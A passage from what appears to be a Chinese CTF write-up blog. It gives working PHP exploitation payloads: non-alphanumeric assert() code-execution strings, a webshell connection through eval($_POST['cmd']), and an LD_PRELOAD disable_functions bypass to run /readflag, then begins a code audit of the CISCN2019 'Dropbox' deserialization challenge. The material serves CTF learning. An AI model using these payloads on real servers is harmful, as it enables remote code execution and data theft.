class=\"line\">error_reporting(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'code'</span>]))&#123;</span><br><span class=\"line\">            $code=$_GET[<span class=\"string\">'code'</span>];</span><br><span class=\"line\">                    <span class=\"keyword\">if</span>(strlen($code)&gt;<span class=\"number\">40</span>)&#123;  </span><br><span class=\"line\">                                        <span class=\"keyword\">die</span>(<span class=\"string\">\"This is too Long.\"</span>);</span><br><span class=\"line\">                                                &#125;</span><br><span class=\"line\">                    <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">\"/[A-Za-z0-9]+/\"</span>,$code))&#123;</span><br><span class=\"line\">                                        <span class=\"keyword\">die</span>(<span class=\"string\">\"NO.\"</span>);</span><br><span class=\"line\">                                                &#125;</span><br><span class=\"line\">                    @<span class=\"keyword\">eval</span>($code);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// <span class=\"meta\">?&gt;</span></span></span><br></pre></td></tr></table></figure>\n\n<p> 传入一个code参数，长度不能大于40，不能包含大小写字母和数字</p>\n<p>可以使用取反或者异或拼凑函数</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?code&#x3D;$_&#x3D;(~?&gt;);$$_&#123;%27__%27&#125;($$_&#123;%27_%27&#125;);&amp;_&#x3D;phpinfo()&amp;__&#x3D;assert</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">%A0%AF%B0%AC%AB是_GET的取反的值，$$_&#123;%27__%27&#125;($$_&#123;%27_%27&#125;)&#96;就相当于 $_GET&#123;&#39;__&#39;&#125;($_GET&#123;&#39;_&#39;&#125;)   联合起来就是assert(phpinfo())</span><br></pre></td></tr></table></figure>\n\n\n\n<p>关于assert函数**</p>\n<p>PHP 5 assert ( <a href=\"https://www.php.net/manual/zh/language.pseudo-types.php#language.types.mixed\" target=\"_blank\" rel=\"noopener\">mixed</a> <code>$assertion</code> [, string <code>$description</code> ] ) : bool</p>\n<p>PHP 7 assert ( <a href=\"https://www.php.net/manual/zh/language.pseudo-types.php#language.types.mixed\" target=\"_blank\" rel=\"noopener\">mixed</a> <code>$assertion</code> [, Throwable <code>$exception</code> ] ) : bool</p>\n<p><strong>assert()</strong> 会检查指定的 <code>assertion</code> 并在结果为 <strong><code>FALSE</code></strong> 时采取适当的行动。</p>\n<p>如果 <code>assertion</code> 是字符串，它将会被 <strong>assert()</strong> 当做 PHP 代码来执行。 <code>assertion</code> 是字符串的优势是当禁用断言时它的开销会更小，并且在断言失败时消息会包含 <code>assertion</code> 表达式。 这意味着如果你传入了 boolean 的条件作为 <code>assertion</code>，这个条件将不会显示为断言函数的参数；在调用你定义的 <a href=\"https://www.php.net/manual/zh/function.assert-options.php\" target=\"_blank\" rel=\"noopener\">assert_options()</a> 处理函数时，条件会转换为字符串，而布尔值 <strong><code>FALSE</code></strong> 会被转换成空字符串。</p>\n<p><img src=\"/pic/64.png\" alt=\"\"></p>\n<p>先查看phpinfo()</p>\n<p><img src=\"/pic/62.png\" alt=\"\"></p>\n<p>禁用了很多执行系统命令的函数</p>\n<p><img src=\"/pic/63.png\" alt=\"\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,dl</span><br></pre></td></tr></table></figure>\n\n<p>扫描当前目录 </p>\n<p>post 数据： <code>_=print_r(scandir(%27./%27))&amp;__=assert</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Array (    [0] &#x3D;&gt; .    [1] &#x3D;&gt; ..    [2] &#x3D;&gt; index.php )</span><br></pre></td></tr></table></figure>\n\n<p>扫描根目录</p>\n<p>post数据：<code>_=print_r(scandir(%27/%27))&amp;__=assert</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Array ( [0] &#x3D;&gt; . [1] &#x3D;&gt; .. [2] &#x3D;&gt; .dockerenv [3] &#x3D;&gt; bin [4] &#x3D;&gt; boot [5] &#x3D;&gt; dev [6] &#x3D;&gt; etc [7] &#x3D;&gt; flag [8] &#x3D;&gt; home [9] &#x3D;&gt; lib [10] &#x3D;&gt; lib64 [11] &#x3D;&gt; media [12] &#x3D;&gt; mnt [13] &#x3D;&gt; opt [14] &#x3D;&gt; proc [15] &#x3D;&gt; readflag [16] &#x3D;&gt; root [17] &#x3D;&gt; run [18] &#x3D;&gt; sbin [19] &#x3D;&gt; srv [20] &#x3D;&gt; sys [21] &#x3D;&gt; tmp [22] &#x3D;&gt; usr [23] &#x3D;&gt; var )</span><br></pre></td></tr></table></figure>\n\n<p>发现有一个flag文件和一个readflag文件。尝试读取内容</p>\n<p>读取flag中的文件是空的；</p>\n<p>post数据：<code>_=var_dump(file_get_contents(%27/flag%27))&amp;__=assert</code></p>\n<p>post数据：<code>_=var_dump(file_get_contents(%27/readflag%27))&amp;__=assert</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">string(8856) &quot;ELF\u0002\u0001\u0001\u0003&gt;\u0001�\u0006@�\u001a@8 @\u001f\u001e\u0006\u0005@@@�\u0001�\u0001\b\u0003\u00048\u00028\u00028\u0002\u001c\u001c\u0001\u0001\u0005\f \f \u0001\u0006� � � x\u0002�\u0002 \u0002\u0006� � � �\u0001�\u0001\b\u0004\u0004T\u0002T\u0002T\u0002DD\u0004P�td\u0004�\b�\b�\b&lt;&lt;\u0004Q�td\u0006\u0010R�td\u0004� � � (\u0002(\u0002\u0001&#x2F;lib64&#x2F;ld-linux-x86-64.so.2\u0004\u0010\u0001GNU\u0002\u0006 \u0004\u0014\u0003GNU�íf­CI�&#96;[Xa\f���V�\u0001\u0001\u0001Q \u001a\u0012?\u0012m 8\u0012| � \u000b\u0012)&quot;\u0012\u0012!\u0012libc.so.6setuidsetegidsystemseteuid__cxa_finalizesetgid__libc_start_main_ITM_deregisterTMCloneTable__gmon_start___Jv_RegisterClasses_ITM_registerTMCloneTableGLIBC_2.2.5\u0002\u0002\u0002\u0002\u0002\u0002\u0002\u0001\u0001\u0001\u0010u\u001ai \u0002�� \b�\u0007� \b&#96;\u0007H\u0010 \bH\u0010 �\u000f \u0006\u0001�\u000f \u0006\u0003�\u000f \u0006\u0004�\u000f \u0006\u0006�\u000f \u0006\u0007�\u000f \u0006 \u0018\u0010 \u0007\u0002 \u0010 \u0007\u0005(\u0010 \u0007\b0\u0010 \u0007 8\u0010 \u0007\u000bH��\bH�\u0005� H��t\u0002��H��\b��5� �%� \u000f\u001f@�%� h������%� h\u0001������%� h\u0002������%� h\u0003�����%� h\u0004�����%b f�1�I��^H��H���PTL�\u0005�\u0001H� s\u0001H�&#x3D;\f\u0001�\u0015\u000e �\u000f\u001fDH�&#x3D;y H�\u0005y UH)�H��H��\u000ev\u0015H�\u0005�\b H��t ]��f\u000f\u001fD]�\u000f\u001f@f.\u000f\u001f�H�&#x3D;9 H�52 UH)�H��H��\u0003H��H��?H\u0001�H��t\u0018H�\u0005�\b H��t\f]��f\u000f\u001f�]�\u000f\u001f@f.\u000f\u001f��&#x3D;�\b u&#39;H�&#x3D;�\b UH��t\fH�&#x3D;�\b � ����H���]�\u0005�\b \u0001��\u000f\u001f@f.\u000f\u001f�H�&#x3D;A\u0006 H�?u\u000b�^���f\u000f\u001fDH�\u0005)\b H��t�UH����]�@���UH����������~������_������@���H�&#x3D;���\u001f����]�f.\u000f\u001f�f�AWAVA��AUATL�%�\u0005 UH�-�\u0005 SI��I��L)�H��\bH��\u0003����H��t 1�\u000f\u001f�L��L��D��A�\u0014�H��\u0001H9�u�H��\b[]A\\A]A^A_Ðf.\u000f\u001f���H��\bH��\b�\u0001\u0002&#x2F;bin&#x2F;cat &#x2F;flag\u0001\u001b\u0003;8\u0006l�������������T\f����l��������,\u0001\u0014\u0001zR\u0001x\u0010\u0001\u001b\f\u0007\b�\u0001\u0007\u0010\u0014\u001c����+\u0014\u0001zR\u0001x\u0010\u0001\u001b\f\u0007\b�\u0001$\u001c����&#96;\u000e\u0010F\u000e\u0018J\u000f\u000bw\b�?\u001a;*3$&quot;\u0014D\u0018���\b\u001c\\@���TA\u000e\u0010�\u0002C \u0006\u0002O\f\u0007\bD|����eB\u000e\u0010�\u0002B\u000e\u0018�\u0003E\u000e �\u0004B\u000e(�\u0005H\u000e0�\u0006H\u000e8�\u0007M\u000e@r\u000e8A\u000e0A\u000e(B\u000e B\u000e\u0018B\u000e\u0010B\u000e\b\u0014�����\u0002�\u0007&#96;\u0007\u0001\u0001\f\u0018\u0006 �\b\u0019� \u001b\b\u001a� \u001c\b���o�\u0002\u0005�\u0003\u0006�\u0002 �\u000b\u0018\u0015\u0003\u0010 \u0002x\u0014\u0007\u0017�\u0005\u0007�\u0004\b� \u0018���o\b���o�\u0004���o\u0001���o�\u0004���o\u0003� F\u0006V\u0006f\u0006v\u0006�\u0006H\u0010 GCC: (Debian 6.3.0-18+deb9u1) 6.3.0 20170516\u0003\u00018\u0002\u0003\u0002T\u0002\u0003\u0003t\u0002\u0003\u0004�\u0002\u0003\u0005�\u0002\u0003\u0006�\u0003\u0003\u0007�\u0004\u0003\b�\u0004\u0003 �\u0004\u0003 �\u0005\u0003\u000b\u0018\u0006\u0003\f0\u0006\u0003 �\u0006\u0003\u000e�\u0006\u0003\u000f�\b\u0003\u0010�\b\u0003\u0011�\b\u0003\u0012 \u0003\u0013� \u0003\u0014� \u0003\u0015� \u0003\u0016� \u0003\u0017�\u000f \u0003\u0018\u0010 \u0003\u0019@\u0010 \u0003\u001aP\u0010 \u0003\u001b\u0001\u0004��\f\u0001\u0015� \u0019\u0002\u000e�\u0006\u001b\u0002\u000e\u0010\u0007.\u0002\u000e&#96;\u0007D\u0001\u001aP\u0010 \u0001S\u0001\u0014� z\u0002\u000e�\u0007�\u0001\u0013� �\u0004��\u0001\u0004���\u0001\u0012\b �\u0001\u0015� \u0004���\u0013� �\u0001\u0016� �\u0013� �\u0011�\b \u0001\u0001\u0018\u0010 \u0001\u0012\u000e�\b\u00020\u0001 �\u0001 \u0019@\u0010 L\u0001\u0010\u0019P\u0010 *\u0001\u0012\u000f�\bS\u0001\u0012g\u0001\u0012�\u0001\u0010\u0019@\u0010 �\u0001 �\u0001\u0011\u0002\u0019H\u0010 �\u0001\u0011\u0010�\b\u0004�\u0001\u0012\u000e0\be�\u0010\u001aX\u0010 �\u0001\u0012\u000e�\u0006+�\u0001\u0010\u001aP\u0010 �\u0001\u0012\u000e�\u0007T�\u0001\u0012�\u0001 \u0007\u0002\u0011\u0002\u0019P\u0010 \u0013\u0002 -\u0002\u0012A\u0002&quot;�\u0001\u0012\u000b\u0018\u0006]\u0002\u0012r\u0002\u0012crtstuff.c__JCR_LIST__deregister_tm_clones__do_global_dtors_auxcompleted.6972__do_global_dtors_aux_fini_array_entryframe_dummy__frame_dummy_init_array_entryreadflag.c__FRAME_END____JCR_END____init_array_end_DYNAMIC__init_array_start__GNU_EH_FRAME_HDR_GLOBAL_OFFSET_TABLE___libc_csu_fini_ITM_deregisterTMCloneTable_edatasystem@@GLIBC_2.2.5__libc_start_main@@GLIBC_2.2.5__data_start__gmon_start____dso_handle_IO_stdin_used__libc_csu_init__bss_startmainsetgid@@GLIBC_2.2.5_Jv_RegisterClasses__TMC_END___ITM_registerTMCloneTablesetuid@@GLIBC_2.2.5__cxa_finalize@@GLIBC_2.2.5setegid@@GLIBC_2.2.5seteuid@@GLIBC_2.2.5.symtab.strtab.shstrtab.interp.note.ABI-tag.note.gnu.build-id.gnu.hash.dynsym.dynstr.gnu.version.gnu.version_r.rela.dyn.rela.plt.init.plt.got.text.fini.rodata.eh_frame_hdr.eh_frame.init_array.fini_array.jcr.dynamic.got.plt.data.bss.comment\u001b\u0001\u00028\u00028\u0002\u001c\u0001#\u0007\u0002T\u0002T\u0002 \u00041\u0007\u0002t\u0002t\u0002$\u0004D���o\u0002�\u0002�\u0002\u001c\u0005\bN\u000b\u0002�\u0002�\u0002 \u0001\u0006\u0001\b\u0018V\u0003\u0002�\u0003�\u0003�\u0001^���o\u0002�\u0004�\u0004\u0018\u0005\u0002\u0002k���o\u0002�\u0004�\u0004 \u0006\u0001\bz\u0004\u0002�\u0004�\u0004�\u0005\b\u0018�\u0004B�\u0005�\u0005x\u0005\u0018\b\u0018�\u0001\u0006\u0018\u0006\u0018\u0006\u0017\u0004�\u0001\u00060\u00060\u0006&#96;\u0010\u0010�\u0001\u0006�\u0006�\u0006\b\b�\u0001\u0006�\u0006�\u0006\u0002\u0002\u0010�\u0001\u0006�\b�\b \u0004�\u0001\u0002�\b�\b\u0013\u0004�\u0001\u0002�\b�\b&lt;\u0004�\u0001\u0002 \f\u0001\b�\u000e\u0003� � \b\b\b�\u000f\u0003� � \b\b\b�\u0001\u0003� � \b\b�\u0006\u0003� � �\u0001\u0006\b\u0010�\u0001\u0003�\u000f �\u000f0\b\b�\u0001\u0003\u0010 \u0010@\b\b�\u0001\u0003@\u0010 @\u0010\u0010\b�\b\u0003P\u0010 P\u0010\b\u0001\u0003\u0001\u00010P\u0010-\u0001\u0001\u0001\u0002�\u0010�\u0006\u001d&#x2F;\b\u0018 \u0003@\u0017�\u0002\u0001\u0011\u0003�\u0019\f\u0001\u0001&quot;</span><br></pre></td></tr></table></figure>\n\n<p>是linux可执文件</p>\n<p>连接蚁剑 payload :</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?code&#x3D;$_&#x3D;(~%A0%B8%BA%AB);$$_&#123;%27__%27&#125;($$_&#123;%27_%27&#125;);&amp;__&#x3D;assert&amp;_&#x3D;eval($_POST[&#39;cmd&#39;])</span><br></pre></td></tr></table></figure>\n\n<p>应该是要绕过disable_function,从而执行readflag，项目地址</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https:&#x2F;&#x2F;github.com&#x2F;yangyangwithgnu&#x2F;bypass_disablefunc_via_LD_PRELOAD</span><br></pre></td></tr></table></figure>\n\n<p>只有/tmp有文件修改权限，上传<code>bypass_disablefunc.php、bypass_disablefunc_x64.so、bypass_disablefunc_x86.so</code>到/tmp下</p>\n<p>最后payload:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?code&#x3D;$_&#x3D;(~%A0%B8%BA%AB);$$_&#123;%27__%27&#125;($$_&#123;%27_%27&#125;);&amp;__&#x3D;assert&amp;_&#x3D;include &quot;&#x2F;tmp&#x2F;bypass_disablefunc.php&quot;&amp;cmd&#x3D;&#x2F;readflag&amp;outpath&#x3D;&#x2F;tmp&#x2F;xx&amp;sopath&#x3D;&#x2F;tmp&#x2F;bypass_disablefunc_x64.so</span><br></pre></td></tr></table></figure>\n\n<p>输出为</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> example: http:&#x2F;&#x2F;site.com&#x2F;bypass_disablefunc.php?cmd&#x3D;pwd&amp;outpath&#x3D;&#x2F;tmp&#x2F;xx&amp;sopath&#x3D;&#x2F;var&#x2F;www&#x2F;bypass_disablefunc_x64.so</span><br><span class=\"line\"></span><br><span class=\"line\">cmdline: &#x2F;readflag &gt; &#x2F;tmp&#x2F;xx 2&gt;&amp;1</span><br><span class=\"line\"></span><br><span class=\"line\">output:</span><br><span class=\"line\">flag&#123;6e16639a-9eca-45b8-a972-e61da4146393&#125;</span><br></pre></td></tr></table></figure>"},{"title":"buuoj刷题记录12-CISCN2019","date":"2020-02-09T16:04:17.000Z","_content":"\n## 华北赛区 Day1 Web1 Dropbox\n\n拿到题目是一个登入页面\n\n注册，登入，上传文件\n\n上传一个图片，上传成功。点击下载，下载时发现有任意文件下载漏洞\n\n把文件下载下来进行代码审计\n\n<!--more-->\n\n```php+HTML\n//index.php\n<?php\nsession_start();\nif (!isset($_SESSION['login'])) {\n    header(\"Location: login.php\");\n    die();\n}\n?>\n\n\n<!DOCTYPE html>\n<html>\n\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1, shrink-to-fit=no\">\n<title>网盘管理</title>\n\n<head>\n    <link href=\"static/css/bootstrap.min.css\" rel=\"stylesheet\">\n    <link href=\"static/css/panel.css\" rel=\"stylesheet\">\n    <script src=\"static/js/jquery.min.js\"></script>\n    <script src=\"static/js/bootstrap.bundle.min.js\"></script>\n    <script src=\"static/js/toast.js\"></script>\n    <script src=\"static/js/panel.js\"></script>\n</head>\n\n<body>\n    <nav aria-label=\"breadcrumb\">\n    <ol class=\"breadcrumb\">\n        <li class=\"breadcrumb-item active\">管理面板</li>\n        <li class=\"breadcrumb-item active\"><label for=\"fileInput\" class=\"fileLabel\">上传文件</label></li>\n        <li class=\"active ml-auto\"><a href=\"#\">你好 <?php echo $_SESSION['username']?></a></li>\n    </ol>\n</nav>\n<input type=\"file\" id=\"fileInput\" class=\"hidden\">\n<div class=\"top\" id=\"toast-container\"></div>\n\n<?php\ninclude \"class.php\";\n\n$a = new FileList($_SESSION['sandbox']);\n$a->Name();\n$a->Size();\n?>\n```\n\n```php+HTML\n//download.php\n<?php\nsession_start();\nif (!isset($_SESSION['login'])) {\n    header(\"Location: login.php\");\n    die();\n}\n\nif (!isset($_POST['filename'])) {\n    die();\n}\n\ninclude \"class.php\";\nini_set(\"open_basedir\", getcwd() . \":/etc:/tmp\");\n\nchdir($_SESSION['sandbox']);\n$file = new File();\n$filename = (string) $_POST['filename'];\nif (strlen($filename) < 40 && $file->open($filename) && stristr($filename, \"flag\") === false) {   //stristr 搜索字符串在另一字符串中的第一次出现不区分大小写\n    Header(\"Content-type: application/octet-stream\");\n    Header(\"Content-Disposition: attachment; filename=\" . basename($filename));\n    echo $file->close();\n} else {\n    echo \"File not exist\";\n}\n?>\n\n```\n\n```php+HTML\n//delete.php\n<?php\nsession_start();\nif (!isset($_SESSION['login'])) {\n    header(\"Location: login.php\");\n    die();\n}\n\nif (!isset($_POST['filename'])) {\n    die();\n}\n\ninclude \"class.php\";\n\nchdir($_SESSION['sandbox']);\n$file = new File();\n$filename = (string) $_POST['filename'];\nif (strlen($filename) < 40 && $file->open($filename)) {\n    $file->detele();\n    Header(\"Content-type: application/json\");\n    $response = array(\"success\" => true, \"error\" => \"\");\n    echo json_encode($response);\n} else {\n    Header(\"Content-type: application/json\");\n    $response = array(\"success\" => false, \"error\" => \"File not exist\");\n    echo json_encode($response);\n}\n?>\n```\n\n```php+HTML\n//register.php\n<?php\nsession_start();\nif (isset($_SESSION['login'])) {\n    header(\"Location: index.php\");\n    die();\n}\n?>\n\n<!doctype html>\n\n<head>\n  <meta charset=\"utf-8\">\n  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1, shrink-to-fit=no\">\n  <meta name=\"description\" content=\"\">\n  <title>注册</title>\n\n  <!-- Bootstrap core CSS -->\n  <link href=\"static/css/bootstrap.min.css\" rel=\"stylesheet\">\n\n\n  <style>\n    .bd-placeholder-img {\n      font-size: 1.125rem;\n      text-anchor: middle;\n    }\n\n    @media (min-width: 768px) {\n      .bd-placeholder-img-lg {\n        font-size: 3.5rem;\n      }\n    }\n  </style>\n  <!-- Custom styles for this template -->\n  <link href=\"static/css/std.css\" rel=\"stylesheet\">\n</head>\n\n<body class=\"text-center\">\n  <form class=\"form-signin\" action=\"register.php\" method=\"POST\">\n    <h1 class=\"h3 mb-3 font-weight-normal\">注册</h1>\n    <label for=\"username\" class=\"sr-only\">Username</label>\n    <input type=\"text\" name=\"username\" class=\"form-control\" placeholder=\"Username\" required autofocus>\n    <label for=\"password\" class=\"sr-only\">Password</label>\n    <input type=\"password\" name=\"password\" class=\"form-control\" placeholder=\"Password\" required>\n    <button class=\"btn btn-lg btn-primary btn-block\" type=\"submit\">提交</button>\n    <p class=\"mt-5 mb-3 text-muted\">&copy; 2018-2019</p>\n  </form>\n</body>\n<div class=\"top\" id=\"toast-container\"></div>\n\n<script src=\"static/js/jquery.min.js\"></script>\n<script src=\"static/js/bootstrap.bundle.min.js\"></script>\n<script src=\"static/js/toast.js\"></script>\n</html>\n\n\n<?php\ninclude \"class.php\";\n\nif (isset($_POST[\"username\"]) && isset($_POST[\"password\"])) {\n    $u = new User();\n    $username = (string) $_POST[\"username\"];\n    $password = (string) $_POST[\"password\"];\n    if (strlen($username) < 20 && strlen($username) > 2 && strlen($password) > 1) {\n        if ($u->add_user($username, $password)) {\n            echo(\"<script>window.location.href='login.php?register';</script>\");\n            die();\n        } else {\n            echo \"<script>toast('此用户名已被使用', 'warning');</script>\";\n            die();\n        }\n    }\n    echo \"<script>toast('请输入有效用户名和密码', 'warning');</script>\";\n}\n?>\n```\n\n```php+HTML\n//class.php\n<?php\nerror_reporting(0);\n$dbaddr = \"127.0.0.1\";\n$dbuser = \"root\";\n$dbpass = \"root\";\n$dbname = \"dropbox\";\n$db = new mysqli($dbaddr, $dbuser, $dbpass, $dbname);\n\nclass User {\n    public $db;\n\n    public function __construct() {\n        global $db;\n        $this->db = $db;\n    }\n\n    public function user_exist($username) {\n        $stmt = $this->db->prepare(\"SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;\");\n        $stmt->bind_param(\"s\", $username);\n        $stmt->execute();\n        $stmt->store_result();\n        $count = $stmt->num_rows;\n        if ($count === 0) {\n            return false;\n        }\n        return true;\n    }\n\n    public function add_user($username, $password) {\n        if ($this->user_exist($username)) {\n            return false;\n        }\n        $password = sha1($password . \"SiAchGHmFx\");\n        $stmt = $this->db->prepare(\"INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);\");\n        $stmt->bind_param(\"ss\", $username, $password);\n        $stmt->execute();\n        return true;\n    }\n\n    public function verify_user($username, $password) {\n        if (!$this->user_exist($username)) {\n            return false;\n        }\n        $password = sha1($password . \"SiAchGHmFx\");\n        $stmt = $this->db->prepare(\"SELECT `password` FROM `users` WHERE `username` = ?;\");\n        $stmt->bind_param(\"s\", $username);\n        $stmt->execute();\n        $stmt->bind_result($expect);\n        $stmt->fetch();\n        if (isset($expect) && $expect === $password) {\n            return true;\n        }\n        return false;\n    }\n\n    public function __destruct() {\n        $this->db->close();\n    }\n}\n\nclass FileList {\n    private $files;\n    private $results;\n    private $funcs;\n\n    public function __construct($path) {\n        $this->files = array();\n        $this->results = array();\n        $this->funcs = array();\n        $filenames = scandir($path);\n\n        $key = array_search(\".\", $filenames);\n        unset($filenames[$key]);   //销毁变量\n        $key = array_search(\"..\", $filenames);\n        unset($filenames[$key]);\n\n        foreach ($filenames as $filename) {\n            $file = new File();\n            $file->open($path . $filename);\n            array_push($this->files, $file);\n            $this->results[$file->name()] = array();\n        }\n    }\n\n    public function __call($func, $args) {  //调用本类不存在的方法，将方法添加到funcs数组中，并将file类中的\n        array_push($this->funcs, $func);   \n        foreach ($this->files as $file) {\n            $this->results[$file->name()][$func] = $file->$func();\n        }\n    }\n\n    public function __destruct() {\n        $table = '<div id=\"container\" class=\"container\"><div class=\"table-responsive\"><table id=\"table\" class=\"table table-bordered table-hover sm-font\">';\n        $table .= '<thead><tr>';\n        foreach ($this->funcs as $func) {\n            $table .= '<th scope=\"col\" class=\"text-center\">' . htmlentities($func) . '</th>';\n        }\n        $table .= '<th scope=\"col\" class=\"text-center\">Opt</th>';\n        $table .= '</thead><tbody>';\n        foreach ($this->results as $filename => $result) {\n            $table .= '<tr>';\n            foreach ($result as $func => $value) {\n                $table .= '<td class=\"text-center\">' . htmlentities($value) . '</td>';    //将$value转换为 HTML 实体\n            }\n            $table .= '<td class=\"text-center\" filename=\"' . htmlentities($filename) . '\"><a href=\"#\" class=\"download\">下载</a> / <a href=\"#\" class=\"delete\">删除</a></td>';\n            $table .= '</tr>';\n        }\n        echo $table;\n    }\n}\n\nclass File {\n    public $filename;\n\n    public function open($filename) {\n        $this->filename = $filename;\n        if (file_exists($filename) && !is_dir($filename)) {\n            return true;\n        } else {\n            return false;\n        }\n    }\n\n    public function name() {\n        return basename($this->filename);  //返回路径中的文件名部分\n    }\n\n    public function size() {\n        $size = filesize($this->filename);\n        $units = array(' B', ' KB', ' MB', ' GB', ' TB');\n        for ($i = 0; $size >= 1024 && $i < 4; $i++) $size /= 1024;\n        return round($size, 2).$units[$i];\n    }\n\n    public function detele() {\n        unlink($this->filename);  //删除文件\n    }\n\n    public function close() {\n        return file_get_contents($this->filename);\n    }\n}\n?>\n```\n\n```php+HTML\n//login.php\n<?php\nsession_start();\nif (isset($_SESSION['login'])) {\n    header(\"Location: index.php\");\n    die();\n}\n?>\n\n<!doctype html>\n\n<head>\n  <meta charset=\"utf-8\">\n  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1, shrink-to-fit=no\">\n  <meta name=\"description\" content=\"\">\n  <title>登录</title>\n\n  <!-- Bootstrap core CSS -->\n  <link href=\"static/css/bootstrap.min.css\" rel=\"stylesheet\">\n\n\n  <style>\n    .bd-placeholder-img {\n      font-size: 1.125rem;\n      text-anchor: middle;\n    }\n\n    @media (min-width: 768px) {\n      .bd-placeholder-img-lg {\n        font-size: 3.5rem;\n      }\n    }\n  </style>\n  <!-- Custom styles for this template -->\n  <link href=\"static/css/std.css\" rel=\"stylesheet\">\n</head>\n\n<body class=\"text-center\">\n  <form class=\"form-signin\" action=\"login.php\" method=\"POST\">\n    <h1 class=\"h3 mb-3 font-weight-normal\">登录</h1>\n    <label for=\"username\" class=\"sr-only\">Username</label>\n    <input type=\"text\" name=\"username\" class=\"form-control\" placeholder=\"Username\" required autofocus>\n    <label for=\"password\" class=\"sr-only\">Password</label>\n    <input type=\"password\" name=\"password\" class=\"form-control\" placeholder=\"Password\" required>\n    <button class=\"btn btn-lg btn-primary btn-block\" type=\"submit\">提交</button>\n    <p class=\"mt-5 text-muted\">还没有账号? <a href=\"register.php\">注册</a></p>\n    <p class=\"text-muted\">&copy; 2018-2019</p>\n  </form>\n  <div class=\"top\" id=\"toast-container\"></div>\n</body>\n\n<script src=\"static/js/jquery.min.js\"></script>\n<script src=\"static/js/bootstrap.bundle.min.js\"></script>\n<script src=\"static/js/toast.js\"></script>\n</html>\n\n\n<?php\ninclude \"class.php\";\n\nif (isset($_GET['register'])) {\n    echo \"<script>toast('注册成功', 'info');</script>\";\n}\n\nif (isset($_POST[\"username\"]) && isset($_POST[\"password\"])) {\n    $u = new User();\n    $username = (string) $_POST[\"username\"];\n    $password = (string) $_POST[\"password\"];\n    if (strlen($username) < 20 && $u->verify_user($username, $password)) {\n        $_SESSION['login'] = true;\n        $_SESSION['username'] = htmlentities($username);\n        $sandbox = \"uploads/\" . sha1($_SESSION['username'] . \"sftUahRiTz\") . \"/\";\n        if (!is_dir($sandbox)) {\n            mkdir($sandbox);\n        }\n        $_SESSION['sandbox'] = $sandbox;\n        echo(\"<script>window.location.href='index.php';</script>\");\n        die();\n    }\n    echo \"<script>toast('账号或密码错误', 'warning');</script>\";\n}\n?>\n```\n\n\n\n在class.php中，File::close()可以读取到文件内容\n\n```php\nclass File {\n    public $filename;\n\n    ...\n\n    public function close() {\n        return file_get_contents($this->filename);\n    }\n}\n```\n\nUser类中的析构函数中有执行close()函数过程\n\n```php\nclass User {\n    public $db;\n\n    public function __construct() {\n        global $db;\n        $this->db = $db;\n    }\n    \n    ...\n    \n    public function __destruct() {\n        $this->db->close();\n    }\n}\n```\n\n而FileList类中没有close()函数，但是如果调用FileList类中的close（）,就会调用到File类中的close()。从而获取flag的内容\n\n```php\nclass FileList {\n    private $files;\n    private $results;\n    private $funcs;\n    \n\tpublic function __construct($path) {\n        $this->files = array();\n        $this->results = array();\n        $this->funcs = array();\n        $filenames = scandir($path);\n\n        $key = array_search(\".\", $filenames);\n        unset($filenames[$key]);   //销毁变量\n        $key = array_search(\"..\", $filenames);\n        unset($filenames[$key]);\n\n        foreach ($filenames as $filename) {\n            $file = new File();\n            $file->open($path . $filename);\n            array_push($this->files, $file);\n            $this->results[$file->name()] = array();\n        }\n   \n   \n    public function __call($func, $args) {  //调用本类不存在的方法，将方法添加到funcs数组中，并将file类中的\n        array_push($this->funcs, $func);   \n        foreach ($this->files as $file) {\n            $this->results[$file->name()][$func] = $file->$func();\n        